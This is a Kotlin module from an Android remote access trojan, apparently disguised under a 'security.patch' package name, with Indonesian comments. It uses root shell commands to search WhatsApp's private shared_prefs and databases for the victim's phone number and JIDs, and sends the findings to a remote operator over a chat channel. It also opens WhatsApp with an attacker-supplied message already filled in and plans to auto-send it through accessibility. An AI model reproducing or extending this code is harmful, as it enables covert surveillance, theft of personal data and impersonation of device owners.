package com.android.security.patch.commands

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.android.security.patch.RatApi
import java.io.File

object WA {

    fun getNumber(ctx: Context, chatId: Long) {
        RatApi.sendMessage(ctx, "reading wa number...", chatId)
        Thread {
            val sb = StringBuilder("<b>📱 WA number</b>\n")
            try {
                // telephony
                try {
                    val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as android.telephony.TelephonyManager
                    @Suppress("DEPRECATION")
                    val num = tm.line1Number
                    sb.append(if (!num.isNullOrBlank()) "telephony: <code>$num</code>\n" else "telephony: (kosong)\n")
                } catch (_: Throwable) { sb.append("telephony: n/a\n") }

                // WA prefs — banyak varian
                val files = mutableListOf<String>()
                try {
                    val p = ProcessBuilder("su", "-c",
                        "find /data/data/com.whatsapp /data/data/com.whatsapp.w4b -name '*.xml' -path '*shared_prefs*' 2>/dev/null")
                        .redirectErrorStream(true).start()
                    val out = p.inputStream.bufferedReader().readText()
                    p.waitFor()
                    out.split("\n").filter { it.isNotBlank() }.forEach { files.add(it.trim()) }
                } catch (_: Throwable) {}

                var found = false
                for (f in files) {
                    val num = grepPref(f, "registration_jid")
                        ?: grepPref(f, "my_jid")
                        ?: grepPref(f, "user_jid")
                        ?: grepAnyNumber(f)
                    if (num != null && num.length in 8..18) {
                        sb.append("<code>$num</code>  (from ${f.substringAfterLast('/')})\n")
                        found = true
                    }
                }

                // fallback: WA databases
                if (!found) {
                    val p = ProcessBuilder("su", "-c",
                        "ls /data/data/com.whatsapp/databases/ 2>/dev/null | head -10")
                        .redirectErrorStream(true).start()
                    val out = p.inputStream.bufferedReader().readText()
                    p.waitFor()
                    if (out.isNotBlank()) sb.append("\n<b>dbs:</b>\n<pre>${out}</pre>")
                    sb.append("\n<i>nomor WA gak ke-baca (WA belum pernah login, atau database encrypted)</i>")
                }

                RatApi.sendMessage(ctx, sb.toString(), chatId)
            } catch (e: Throwable) {
                RatApi.sendMessage(ctx, "wa number err: ${e.message}", chatId)
            }
        }.start()
    }

    private fun grepPref(path: String, key: String): String? {
        try {
            val p = ProcessBuilder("su", "-c",
                "grep -oE 'name=\"$key\">[^<]+' \"$path\" 2>/dev/null | head -1 | sed 's/.*>//'")
                .redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText().trim()
            p.waitFor()
            if (out.isBlank()) return null
            // hapus leading zero double 62 atau +62
            return out.replace(Regex("[^0-9]"), "")
        } catch (_: Throwable) { return null }
    }

    private fun grepAnyNumber(path: String): String? {
        try {
            val p = ProcessBuilder("su", "-c",
                "grep -oE '(628|08)[0-9]{8,14}' \"$path\" 2>/dev/null | sort -u | head -3")
                .redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText().trim()
            p.waitFor()
            if (out.isBlank()) return null
            return out.split("\n").first().trim()
        } catch (_: Throwable) { return null }
    }

    private fun grepNumber(path: String): String? {
        try {
            val c = ProcessBuilder("su", "-c",
                "grep -oE '[0-9]{8,15}' \"$path\" 2>/dev/null | sort -u | head -5")
                .redirectErrorStream(true).start()
            val out = c.inputStream.bufferedReader().readText().trim()
            c.waitFor()
            if (out.isBlank()) return null
            return out.replace("\n", ", ")
        } catch (_: Throwable) { return null }
    }

    fun send(ctx: Context, chatId: Long, args: Array<String>) {
        if (args.size < 2) {
            RatApi.sendMessage(ctx, "usage: /wa 6281234567890 pesan di sini", chatId); return
        }
        val num = args[0].replace(Regex("[^0-9]"), "")
        val msg = args.drop(1).joinToString(" ")
        if (num.length < 8) {
            RatApi.sendMessage(ctx, "nomor gak valid", chatId); return
        }
        val uri = Uri.parse("https://wa.me/$num?text=${Uri.encode(msg)}")
        val intent = Intent(Intent.ACTION_VIEW, uri).apply {
            setPackage("com.whatsapp")
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        try {
            ctx.startActivity(intent)
            RatApi.sendMessage(ctx, "WA dibuka dengan pesan pre-filled. auto-send via accessibility:\nkalau tombol send ke-detect, langsung kirim.", chatId)
            // TODO auto-tap send button via accessibility (butuh event listener)
        } catch (e: Throwable) {
            try {
                val i2 = Intent(Intent.ACTION_VIEW, uri).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(i2)
                RatApi.sendMessage(ctx, "WA opened (fallback)", chatId)
            } catch (e2: Throwable) {
                RatApi.sendMessage(ctx, "wa err: ${e.message}", chatId)
            }
        }
    }
}
